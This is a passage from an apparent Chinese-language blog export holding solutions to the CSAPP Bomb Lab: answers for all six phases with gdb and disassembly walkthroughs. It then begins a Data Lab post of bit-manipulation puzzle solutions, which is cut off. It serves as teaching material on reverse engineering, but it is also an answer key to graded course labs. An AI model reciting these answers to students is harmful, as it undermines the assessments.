此时可以知道，前面提取数据时，是以我们输入的字符的低4bit的数值为偏移量，从0x4024b0开始的字符串按照偏移量提取字符放在栈上，然后与flyers比对。偏移量依次为$9\\ 15\\ 14\\ 5\\ 6\\ 7$ 但是这些字符不可打印出来，所以我们需要加上$16\\times k$来获得可打印的字符 第六题一些心得 不要尝试完整的人肉反汇编成C，而是大概知道哪段代码有哪些功能，然后用gdb调试，看看猜的对不对。比如本题以下代码 1234567891011#from 代码段的401153lea 0x18(%rsp),%rsimov %r14,%raxmov $0x7,%ecxmov %ecx,%edxsub (%rax),%edxmov %edx,(%rax)add $0x4,%raxcmp %rsi,%raxjne 401160 &lt;phase_6+0x6c&gt; 大概知道是改变读入的数字的值，但是不确定确切功能，这时候可以在用gdb，在读入之后的地方设断点，打印这块内存区域的多个字节的值，然后再在这段代码执行后的地方设断点，打印值，观察变化，结合汇编代码，更加容易知道其功能 安利一个gdb插件peda，大大提高gdb的用户体验 解题思路 整段代码分为 个部分 0x4010fc 到 0x401106：读入6个数值 0x40110b 到 0x401151：一个大循环，对读入的数字的合法性进行检查，要求读入的数字的取值范围是$[1,6]$，并且相互之间不相等。（这时候或许就可以暴力了233333） 0x401153 到 0x40116d：另一个循环，对输入的数字顺序进行调整。（一开始想着直接看汇编，但是出错了，后来用gdb调试，很容易就看到了这个特性） 0x401176 到 0x4011a9：一个大循环把链表的node的地址按照一定顺序写到栈上（里面有多个小循环、跳转，比较复杂）。通过大概的反汇编、gdb打印该段代码执行前后内存的值、猜测、测试不同的输入的数字序列，获得该段的功能。 其中，该段中把关于0x6032d0的值写入栈中，所以用gdb命令x/30w 0x6032d0打印改地址附近的多个字节，结果如下 1234560x6032d0 &lt;node1&gt;: 0x0000014c 0x00000001 0x006032e0 0x000000000x6032e0 &lt;node2&gt;: 0x000000a8 0x00000002 0x006032f0 0x000000000x6032f0 &lt;node3&gt;: 0x0000039c 0x00000003 0x00603300 0x000000000x603300 &lt;node4&gt;: 0x000002b3 0x00000004 0x00603310 0x000000000x603310 &lt;node5&gt;: 0x000001dd 0x00000005 0x00603320 0x000000000x603320 &lt;node6&gt;: 0x000001bb 0x00000006 0x00000000 0x00000000 可以看到有6个node，每个node的第三个字节都对应另一个node的地址，很明显，这是一个链表。 由此可以知道该段代码的功能为把node的地址写在栈上，地址在栈上的排列顺序由读入的数字确定。当然，读入的数字的顺序在前面的一段代码被处理了，所以直接从汇编了解其逻辑比较难，还是用gdb打印该段代码执行后的值，并且尝试改变输入的数字的顺序来确定该段的逻辑。 node地址在栈上关于读入的数字的分布规则为 node地址越大，对应的数字越小，1对应0x603320，2对应0x603310，3对应0x603300，4对应0x6032f0，5对应0x6032e0，6对应0x6032d0 node地址按照读入数字的顺序，排列在栈上。 0x4011ab 到 0x4011d9：该段从%rsp+0x20开始，读入前面写到栈上的node地址，然后写到上一个节点的偏移量为8bit的位置，也就是node里存放next node的指针的位置。其实就是按照栈上node地址的排列顺序重新排列链表里node的顺序，其等价的C代码如下： 12345678910111213141516171819struct node&#123; int num; int index; node *next;&#125;;node **next = %rsp+0x28;node **endnode = %rsp+0x50;node *currentnode = *(%rsp+0x20);node *temp;while(1)&#123; temp = *next; currentnode-&gt;next = temp; next += 1; //in fact, it add 8 bytes; if(endnode==next) break; currentnode = temp;&#125;temp-&gt;next = null; 0x4011df 到 0x4011f5：依次访问链表的节点，判断是否有后一个节点的数据大于前一个的情况，如果有，bomb。","raw":"---\ntitle: CSAPP Bomb Lab\ntoc: false\ncomments: true\nmathjax: true\ndate: 2017-09-15 02:04:11\ntags:\n- CSAPP Lab\ndescription: CSAPP 炸弹实验的解答\ncategories:\n- CSAPP\n---\n\n# CSAPP Bomb Lab\n\n### 答案\n\n1. Border relations with Canada have never been better.\n2. 1 2 4 8 16 32\n3. 多个答案\n   - 0    207\n   - 1    311\n   - 2    707\n   - 3    256\n   - 4    389\n   - 5    206\n   - 6    682\n   - 7    327\n4. *应该有多个答案*\n   - 7    0\n5. 一个6个字符的字符串，字符串的ascii值依次为\n   - $9+k\\times16$ \n   - $15+k\\times16$\n   - $14+k\\times16$\n   - $5+k\\times16$\n   - $6+k\\times16$\n   - $7+k\\times16$\n6. ​      4 3 2 1 6 5\n\n### 第一题\n\n#### 解答思路\n\n- string_not_equal函数比对(0x402400)位置的string与输入的string\n- 直接运行gdb，`print (char*)0x402400`即可\n- *不需要读完string_not_equal函数，可以猜测0x402400就是要找的，然后一试就过了。不过也不可以绝对相信函数名，或许出题人骗我们呢 2333*\n\n### 第二题\n\n#### 解答思路\n\n- 汇编代码显示，调用read_six_numbers读入6个数字，放在从栈底开始的24个字节里。测试第一个是否为1，用循环测试后一个是否是前一个的2倍。所以直接输入`1  2  4  8  16  32`即可AC\n\n### 第三题\n\n#### 解题思路\n\n- ```assembly\n  lea    0xc(%rsp),%rcx //rcx=12+rsp\n  lea    0x8(%rsp),%rdx //rdx=8+rsp\n  mov    $0x4025cf,%esi //%d %d\n  mov    $0x0,%eax\n  callq  400bf0 <__isoc99_sscanf@plt>\n  ```\n\n  从调用sscanf前的寄存器准备工作中看出，%esi放着格式字符串，用gdb`print (char*)0x4025cf`打印出`\"%d %d\"`\n\n- 然后测试读入的第一个数字是否大于7，如果是，explode_bomb\n\n- 然后就是一个switch，用gdb`x/14w 0x402470`打印出\n\n  ```assembly\n  0x402470:\t0x00400f7c\t0x00000000\t0x00400fb9\t0x00000000\n  0x402480:\t0x00400f83\t0x00000000\t0x00400f8a\t0x00000000\n  0x402490:\t0x00400f91\t0x00000000\t0x00400f98\t0x00000000\n  0x4024a0:\t0x00400f9f\t0x00000000\n  ```\n\n  按照对应关系确定第二个读入的数字即可\n\n### 第四题\n\n#### 解题思路\n\n- 同样是用sscanf读入两个数字\n- 由于逻辑比较复杂，但是反编译比较简单，可以直接反编译得到结果\n\n### 第五题\n\n#### 解题思路\n\n- ```assembly\n  callq  40131b <string_length>\n  cmp    $0x6,%eax\n  ```\n\n  读入6个字符的字符串\n\n- ```assembly\n  movzbl (%rbx,%rax,1),%ecx\n  mov    %cl,(%rsp)\n  mov    (%rsp),%rdx\n  and    $0xf,%edx\n  movzbl 0x4024b0(%rdx),%edx\n  mov    %dl,0x10(%rsp,%rax,1)\n  ```\n\n  提取每个字符的ascii的低4bits，放在`edx`里，然后从`0x4024b0+edx`的位置读入数据放在栈上\n\n- ```assembly\n  mov    $0x40245e,%esi\n  lea    0x10(%rsp),%rdi\n  callq  401338 <strings_not_equal>\n  ```\n\n  后面调用了strings_not_equal，比对0x40245e处的字符串及我们放在栈上的数据。\n\n- 用gdb分别打印0x4024b0  0x40245e处的字符串，获得\n\n  - `maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?`\n  -  `flyers`\n\n- 此时可以知道，前面提取数据时，是以我们输入的字符的低4bit的数值为偏移量，从0x4024b0开始的字符串按照偏移量提取字符放在栈上，然后与`flyers`比对。偏移量依次为$9\\ 15\\ 14\\ 5\\ 6\\ 7$\n\n- 但是这些字符不可打印出来，所以我们需要加上$16\\times k$来获得可打印的字符\n\n### 第六题\n\n#### 一些心得\n\n- 不要尝试完整的人肉反汇编成C，而是大概知道哪段代码有哪些功能，然后用gdb调试，看看猜的对不对。比如本题以下代码\n\n  ```assembly\n  #from 代码段的401153\n  lea    0x18(%rsp),%rsi\n  mov    %r14,%rax\n  mov    $0x7,%ecx\n\n  mov    %ecx,%edx\n  sub    (%rax),%edx\n  mov    %edx,(%rax)\n  add    $0x4,%rax\n  cmp    %rsi,%rax\n  jne    401160 <phase_6+0x6c>\n  ```\n\n  大概知道是改变读入的数字的值，但是不确定确切功能，这时候可以在用gdb，在读入之后的地方设断点，打印这块内存区域的多个字节的值，然后再在这段代码执行后的地方设断点，打印值，观察变化，结合汇编代码，更加容易知道其功能\n\n- 安利一个gdb插件[peda](https://github.com/longld/peda)，大大提高gdb的用户体验\n\n#### 解题思路\n\n- 整段代码分为 个部分\n\n  - 0x4010fc 到 0x401106：读入6个数值\n\n  - 0x40110b 到 0x401151：一个大循环，对读入的数字的合法性进行检查，要求读入的数字的取值范围是$[1,6]$，并且相互之间不相等。（这时候或许就可以暴力了233333）\n\n  - 0x401153 到 0x40116d：另一个循环，对输入的数字顺序进行调整。（一开始想着直接看汇编，但是出错了，后来用gdb调试，很容易就看到了这个特性）\n\n  - 0x401176 到 0x4011a9：一个大循环把链表的node的地址按照一定顺序写到栈上（里面有多个小循环、跳转，比较复杂）。通过大概的反汇编、gdb打印该段代码执行前后内存的值、猜测、测试不同的输入的数字序列，获得该段的功能。\n\n    其中，该段中把关于0x6032d0的值写入栈中，所以用gdb命令`x/30w 0x6032d0`打印改地址附近的多个字节，结果如下\n\n    ```assembly\n    0x6032d0 <node1>:\t0x0000014c\t0x00000001\t0x006032e0\t0x00000000\n    0x6032e0 <node2>:\t0x000000a8\t0x00000002\t0x006032f0\t0x00000000\n    0x6032f0 <node3>:\t0x0000039c\t0x00000003\t0x00603300\t0x00000000\n    0x603300 <node4>:\t0x000002b3\t0x00000004\t0x00603310\t0x00000000\n    0x603310 <node5>:\t0x000001dd\t0x00000005\t0x00603320\t0x00000000\n    0x603320 <node6>:\t0x000001bb\t0x00000006\t0x00000000\t0x00000000\n    ```\n\n    可以看到有6个node，每个node的第三个字节都对应另一个node的地址，很明显，这是一个链表。\n\n    由此可以知道该段代码的功能为**把node的地址写在栈上，地址在栈上的排列顺序由读入的数字确定**。当然，读入的数字的顺序在前面的一段代码被处理了，所以直接从汇编了解其逻辑比较难，还是用gdb打印该段代码执行后的值，并且尝试改变输入的数字的顺序来确定该段的逻辑。\n\n    **node地址在栈上关于读入的数字的分布规则为**\n\n    - node地址越大，对应的数字越小，1对应0x603320，2对应0x603310，3对应0x603300，4对应0x6032f0，5对应0x6032e0，6对应0x6032d0\n    - node地址按照读入数字的顺序，排列在栈上。\n\n  - 0x4011ab 到 0x4011d9：该段从`%rsp+0x20`开始，读入前面写到栈上的node地址，然后写到上一个节点的偏移量为8bit的位置，也就是node里存放next node的指针的位置。其实就是按照栈上node地址的排列顺序重新排列链表里node的顺序，其等价的C代码如下：\n\n    ```c\n    struct node{\n    \tint num;\n    \tint index;\n    \tnode *next;\n    };\n\n    node **next = %rsp+0x28;\n    node **endnode = %rsp+0x50;\n    node *currentnode = *(%rsp+0x20);\n    node *temp;\n    while(1){\n    \ttemp = *next;\n    \tcurrentnode->next = temp;\n    \tnext += 1;\t//in fact, it add 8 bytes;\n    \tif(endnode==next)\n    \t\tbreak;\n    \tcurrentnode = temp;\n    }\n    temp->next = null;\n    ```\n\n  - 0x4011df 到 0x4011f5：依次访问链表的节点，判断是否有后一个节点的数据大于前一个的情况，如果有，bomb。","content":"<h1 id=\"CSAPP-Bomb-Lab\"><a href=\"#CSAPP-Bomb-Lab\" class=\"headerlink\" title=\"CSAPP Bomb Lab\"></a>CSAPP Bomb Lab</h1><h3 id=\"答案\"><a href=\"#答案\" class=\"headerlink\" title=\"答案\"></a>答案</h3><ol>\n<li>Border relations with Canada have never been better.</li>\n<li>1 2 4 8 16 32</li>\n<li>多个答案<ul>\n<li>0    207</li>\n<li>1    311</li>\n<li>2    707</li>\n<li>3    256</li>\n<li>4    389</li>\n<li>5    206</li>\n<li>6    682</li>\n<li>7    327</li>\n</ul>\n</li>\n<li><em>应该有多个答案</em><ul>\n<li>7    0</li>\n</ul>\n</li>\n<li>一个6个字符的字符串，字符串的ascii值依次为<ul>\n<li>$9+k\\times16$ </li>\n<li>$15+k\\times16$</li>\n<li>$14+k\\times16$</li>\n<li>$5+k\\times16$</li>\n<li>$6+k\\times16$</li>\n<li>$7+k\\times16$</li>\n</ul>\n</li>\n<li>​      4 3 2 1 6 5</li>\n</ol>\n<h3 id=\"第一题\"><a href=\"#第一题\" class=\"headerlink\" title=\"第一题\"></a>第一题</h3><h4 id=\"解答思路\"><a href=\"#解答思路\" class=\"headerlink\" title=\"解答思路\"></a>解答思路</h4><ul>\n<li>string_not_equal函数比对(0x402400)位置的string与输入的string</li>\n<li>直接运行gdb，<code>print (char*)0x402400</code>即可</li>\n<li><em>不需要读完string_not_equal函数，可以猜测0x402400就是要找的，然后一试就过了。不过也不可以绝对相信函数名，或许出题人骗我们呢 2333</em></li>\n</ul>\n<h3 id=\"第二题\"><a href=\"#第二题\" class=\"headerlink\" title=\"第二题\"></a>第二题</h3><h4 id=\"解答思路-1\"><a href=\"#解答思路-1\" class=\"headerlink\" title=\"解答思路\"></a>解答思路</h4><ul>\n<li>汇编代码显示，调用read_six_numbers读入6个数字，放在从栈底开始的24个字节里。测试第一个是否为1，用循环测试后一个是否是前一个的2倍。所以直接输入<code>1  2  4  8  16  32</code>即可AC</li>\n</ul>\n<h3 id=\"第三题\"><a href=\"#第三题\" class=\"headerlink\" title=\"第三题\"></a>第三题</h3><h4 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h4><ul>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lea    0xc(%rsp),%rcx //rcx=12+rsp</span><br><span class=\"line\">lea    0x8(%rsp),%rdx //rdx=8+rsp</span><br><span class=\"line\">mov    $0x4025cf,%esi //%d %d</span><br><span class=\"line\">mov    $0x0,%eax</span><br><span class=\"line\">callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure>\n<p>从调用sscanf前的寄存器准备工作中看出，%esi放着格式字符串，用gdb<code>print (char*)0x4025cf</code>打印出<code>&quot;%d %d&quot;</code></p>\n</li>\n<li><p>然后测试读入的第一个数字是否大于7，如果是，explode_bomb</p>\n</li>\n<li><p>然后就是一个switch，用gdb<code>x/14w 0x402470</code>打印出</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x402470:\t0x00400f7c\t0x00000000\t0x00400fb9\t0x00000000</span><br><span class=\"line\">0x402480:\t0x00400f83\t0x00000000\t0x00400f8a\t0x00000000</span><br><span class=\"line\">0x402490:\t0x00400f91\t0x00000000\t0x00400f98\t0x00000000</span><br><span class=\"line\">0x4024a0:\t0x00400f9f\t0x00000000</span><br></pre></td></tr></table></figure>\n<p>按照对应关系确定第二个读入的数字即可</p>\n</li>\n</ul>\n<h3 id=\"第四题\"><a href=\"#第四题\" class=\"headerlink\" title=\"第四题\"></a>第四题</h3><h4 id=\"解题思路-1\"><a href=\"#解题思路-1\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h4><ul>\n<li>同样是用sscanf读入两个数字</li>\n<li>由于逻辑比较复杂，但是反编译比较简单，可以直接反编译得到结果</li>\n</ul>\n<h3 id=\"第五题\"><a href=\"#第五题\" class=\"headerlink\" title=\"第五题\"></a>第五题</h3><h4 id=\"解题思路-2\"><a href=\"#解题思路-2\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h4><ul>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">callq  40131b &lt;string_length&gt;</span><br><span class=\"line\">cmp    $0x6,%eax</span><br></pre></td></tr></table></figure>\n<p>读入6个字符的字符串</p>\n</li>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movzbl (%rbx,%rax,1),%ecx</span><br><span class=\"line\">mov    %cl,(%rsp)</span><br><span class=\"line\">mov    (%rsp),%rdx</span><br><span class=\"line\">and    $0xf,%edx</span><br><span class=\"line\">movzbl 0x4024b0(%rdx),%edx</span><br><span class=\"line\">mov    %dl,0x10(%rsp,%rax,1)</span><br></pre></td></tr></table></figure>\n<p>提取每个字符的ascii的低4bits，放在<code>edx</code>里，然后从<code>0x4024b0+edx</code>的位置读入数据放在栈上</p>\n</li>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov    $0x40245e,%esi</span><br><span class=\"line\">lea    0x10(%rsp),%rdi</span><br><span class=\"line\">callq  401338 &lt;strings_not_equal&gt;</span><br></pre></td></tr></table></figure>\n<p>后面调用了strings_not_equal，比对0x40245e处的字符串及我们放在栈上的数据。</p>\n</li>\n<li><p>用gdb分别打印0x4024b0  0x40245e处的字符串，获得</p>\n<ul>\n<li><code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code></li>\n<li><code>flyers</code></li>\n</ul>\n</li>\n<li><p>此时可以知道，前面提取数据时，是以我们输入的字符的低4bit的数值为偏移量，从0x4024b0开始的字符串按照偏移量提取字符放在栈上，然后与<code>flyers</code>比对。偏移量依次为$9\\ 15\\ 14\\ 5\\ 6\\ 7$</p>\n</li>\n<li><p>但是这些字符不可打印出来，所以我们需要加上$16\\times k$来获得可打印的字符</p>\n</li>\n</ul>\n<h3 id=\"第六题\"><a href=\"#第六题\" class=\"headerlink\" title=\"第六题\"></a>第六题</h3><h4 id=\"一些心得\"><a href=\"#一些心得\" class=\"headerlink\" title=\"一些心得\"></a>一些心得</h4><ul>\n<li><p>不要尝试完整的人肉反汇编成C，而是大概知道哪段代码有哪些功能，然后用gdb调试，看看猜的对不对。比如本题以下代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#from 代码段的401153</span><br><span class=\"line\">lea    0x18(%rsp),%rsi</span><br><span class=\"line\">mov    %r14,%rax</span><br><span class=\"line\">mov    $0x7,%ecx</span><br><span class=\"line\"></span><br><span class=\"line\">mov    %ecx,%edx</span><br><span class=\"line\">sub    (%rax),%edx</span><br><span class=\"line\">mov    %edx,(%rax)</span><br><span class=\"line\">add    $0x4,%rax</span><br><span class=\"line\">cmp    %rsi,%rax</span><br><span class=\"line\">jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure>\n<p>大概知道是改变读入的数字的值，但是不确定确切功能，这时候可以在用gdb，在读入之后的地方设断点，打印这块内存区域的多个字节的值，然后再在这段代码执行后的地方设断点，打印值，观察变化，结合汇编代码，更加容易知道其功能</p>\n</li>\n<li><p>安利一个gdb插件<a href=\"https://github.com/longld/peda\" target=\"_blank\" rel=\"noopener\">peda</a>，大大提高gdb的用户体验</p>\n</li>\n</ul>\n<h4 id=\"解题思路-3\"><a href=\"#解题思路-3\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h4><ul>\n<li><p>整段代码分为 个部分</p>\n<ul>\n<li><p>0x4010fc 到 0x401106：读入6个数值</p>\n</li>\n<li><p>0x40110b 到 0x401151：一个大循环，对读入的数字的合法性进行检查，要求读入的数字的取值范围是$[1,6]$，并且相互之间不相等。（这时候或许就可以暴力了233333）</p>\n</li>\n<li><p>0x401153 到 0x40116d：另一个循环，对输入的数字顺序进行调整。（一开始想着直接看汇编，但是出错了，后来用gdb调试，很容易就看到了这个特性）</p>\n</li>\n<li><p>0x401176 到 0x4011a9：一个大循环把链表的node的地址按照一定顺序写到栈上（里面有多个小循环、跳转，比较复杂）。通过大概的反汇编、gdb打印该段代码执行前后内存的值、猜测、测试不同的输入的数字序列，获得该段的功能。</p>\n<p>其中，该段中把关于0x6032d0的值写入栈中，所以用gdb命令<code>x/30w 0x6032d0</code>打印改地址附近的多个字节，结果如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x6032d0 &lt;node1&gt;:\t0x0000014c\t0x00000001\t0x006032e0\t0x00000000</span><br><span class=\"line\">0x6032e0 &lt;node2&gt;:\t0x000000a8\t0x00000002\t0x006032f0\t0x00000000</span><br><span class=\"line\">0x6032f0 &lt;node3&gt;:\t0x0000039c\t0x00000003\t0x00603300\t0x00000000</span><br><span class=\"line\">0x603300 &lt;node4&gt;:\t0x000002b3\t0x00000004\t0x00603310\t0x00000000</span><br><span class=\"line\">0x603310 &lt;node5&gt;:\t0x000001dd\t0x00000005\t0x00603320\t0x00000000</span><br><span class=\"line\">0x603320 &lt;node6&gt;:\t0x000001bb\t0x00000006\t0x00000000\t0x00000000</span><br></pre></td></tr></table></figure>\n<p>可以看到有6个node，每个node的第三个字节都对应另一个node的地址，很明显，这是一个链表。</p>\n<p>由此可以知道该段代码的功能为<strong>把node的地址写在栈上，地址在栈上的排列顺序由读入的数字确定</strong>。当然，读入的数字的顺序在前面的一段代码被处理了，所以直接从汇编了解其逻辑比较难，还是用gdb打印该段代码执行后的值，并且尝试改变输入的数字的顺序来确定该段的逻辑。</p>\n<p><strong>node地址在栈上关于读入的数字的分布规则为</strong></p>\n<ul>\n<li>node地址越大，对应的数字越小，1对应0x603320，2对应0x603310，3对应0x603300，4对应0x6032f0，5对应0x6032e0，6对应0x6032d0</li>\n<li>node地址按照读入数字的顺序，排列在栈上。</li>\n</ul>\n</li>\n<li><p>0x4011ab 到 0x4011d9：该段从<code>%rsp+0x20</code>开始，读入前面写到栈上的node地址，然后写到上一个节点的偏移量为8bit的位置，也就是node里存放next node的指针的位置。其实就是按照栈上node地址的排列顺序重新排列链表里node的顺序，其等价的C代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">node</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> num;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> index;</span><br><span class=\"line\">\tnode *next;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">node **next = %rsp+<span class=\"number\">0x28</span>;</span><br><span class=\"line\">node **endnode = %rsp+<span class=\"number\">0x50</span>;</span><br><span class=\"line\">node *currentnode = *(%rsp+<span class=\"number\">0x20</span>);</span><br><span class=\"line\">node *temp;</span><br><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\ttemp = *next;</span><br><span class=\"line\">\tcurrentnode-&gt;next = temp;</span><br><span class=\"line\">\tnext += <span class=\"number\">1</span>;\t<span class=\"comment\">//in fact, it add 8 bytes;</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(endnode==next)</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\tcurrentnode = temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">temp-&gt;next = null;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>0x4011df 到 0x4011f5：依次访问链表的节点，判断是否有后一个节点的数据大于前一个的情况，如果有，bomb。</p>\n</li>\n</ul>\n</li>\n</ul>\n","slug":"CSAPP-Bomb-Lab","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"https://h-zex.github.io/tags/CSAPP-Lab/"}]},{"title":"CSAPP Data Lab","date":"2017-09-13T05:39:11.000Z","path":"2017/09/13/CSAPP-Data-Lab/","text":"CSAPP data Lab 注意，本文代码出于节省括号避免繁杂的考虑，对运算符优先级利用得比较充分，比如 1&gt;&gt;n+1 等价于 1&gt;&gt;(n+1)，所以代码里写了1&gt;&gt;n+1。 bitAnd12345678910/* * bitAnd - x&amp;y using only ~ and | * Example: bitAnd(6, 5) = 4 * Legal ops: ~ | * Max ops: 8 * Rating: 1 */int bitAnd(int x, int y) &#123; return ~(~x|~y);&#125; 思路 德摩根定律 getByte123456789101112/* * getByte - Extract byte n from word x * Bytes numbered from 0 (LSB) to 3 (MSB) * Examples: getByte(0x12345678,1) = 0x56 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 6 * Rating: 2 */int getByte(int x, int n) &#123; int bias = n&lt;&lt;3; return (x&gt;&gt;bias)&amp;0xFF;&#125; 思路 移位到最低的1byte然后用0xFF提取 logicalShift1234567891011121314/* * logicalShift - shift x to the right by n, using a logical shift i * Can assume that 0 &lt;= n &lt;= 31 * Examples: logicalShift(0x87654321,4) = 0x08765432 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 20 * Rating: 3 */int logicalShift(int x, int n) &#123; return (1&lt;&lt;32+~n&lt;&lt;1)+~0 &amp; (x&gt;&gt;n); //equal to ((1&lt;&lt;31-n&lt;&lt;1)-1)&amp;(x&gt;&gt;n); //负号优先级高于移位&#125; 思路 因为不能用-，所以用取反加一代替取负 构造低32-nbit的1来提取移位后的数值 因为移位量不能小于0或大于等于32，所以对于n可能是0而导致移位量是32的情况，先移位31位，再移位1位 小技巧，如果n移位k，k$\\in$[0, 32]，则可以n&gt;&gt;(k-!!k)&gt;&gt;!!k bitCount12345678910111213141516171819202122232425/* * bitCount - returns count of number of 1's in word * Examples: bitCount(5) = 2, bitCount(7) = 3 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 40 * Rating: 4 */int bitCount(int x) &#123; int mark1 = 0x55; int mark2 = 0x33; int mark3 = 0x0F; mark1 |= mark1&lt;&lt;8; mark1 |= mark1&lt;&lt;16; mark2 |= mark2&lt;&lt;8; mark2 |= mark2&lt;&lt;16; mark3 |= mark3&lt;&lt;8; mark3 |= mark3&lt;&lt;16; x = (x&gt;&gt;1&amp;mark1)+(x&amp;mark1); //every two bits; clear record; x = (x&gt;&gt;2&amp;mark2)+(x&amp;mark2); //every four bits; clear record; x = (x&gt;&gt;4&amp;mark3)+(x&amp;mark3); //every eight bits; clear record; x = (x&gt;&gt;8)+x; //every 16 bits; record in the low 8 bits; x = (x&gt;&gt;16)+x; //every 32 bits; record in the low 8 bits; return x&amp;0xFF;&#125; 思路 构造0x55555555，提取每两位中的low bit。通过移位及0x55555555，提取每两位中的高位。然后相加，使得结果中，每两位的二进制值就是该两位的bit数目 同样的思路，提取每四位的low bit、high bit，然后相加 因为32==100000(二级制)，也就是只需要5位就可以记录有多少bit数，所以不需要每次都构造常数屏蔽高位的值，直接移位相加然后取低8bit就可以得到最终结果 bang123456789101112131415/* * bang - Compute !x without using ! * Examples: bang(3) = 0, bang(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 4 */int bang(int x) &#123; x |= x&gt;&gt;1; x |= x&gt;&gt;2; x |= x&gt;&gt;4; x |= x&gt;&gt;8; x |= x&gt;&gt;16; return ~x&amp;0x1;&#125; 思路 如果非0，位模式从最高位的1到最低位都填充为1， 如果为0，则位模式还是保持全0 tmin123456789/* * tmin - return minimum two's complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) &#123; return 1&lt;&lt;31;&#125; fitBits12345678910111213/* * fitsBits - return 1 if x can be represented as an * n-bit, two's complement integer. * 1 &lt;= n &lt;= 32 * Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 2 */int fitsBits(int x, int n) &#123; return !(x&gt;&gt;n+~0)|!((x&gt;&gt;n+~0)+1); //equal to !(x&gt;&gt;n-1) | !((x&gt;&gt;n-1)+1)&#125; 思路 算术移n-1位，如果是负数，且可以用n bits的补码表示，则得到-1。如果是正数，则得到0。 divpwr21234567891011121314/* * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30 * Round toward zero * Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 2 */int divpwr2(int x, int n) &#123; int t = x&gt;&gt;31; return (x+(t&amp;1&lt;&lt;n)+(~(t&amp;1)+1))&gt;&gt;n; //equal to (x+(t&amp;1&lt;&lt;n)-(t&amp;1))&gt;&gt;n; //note that &amp; 的优先级低于&lt;&lt;&#125; 思路 直接移位是round down，无论是负数还是正数 所以要实现round to zero , C表达式为x&lt;0 ? x+(pow(2,n)-1)&gt;&gt;n : x&gt;&gt;n negate12345678910/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * 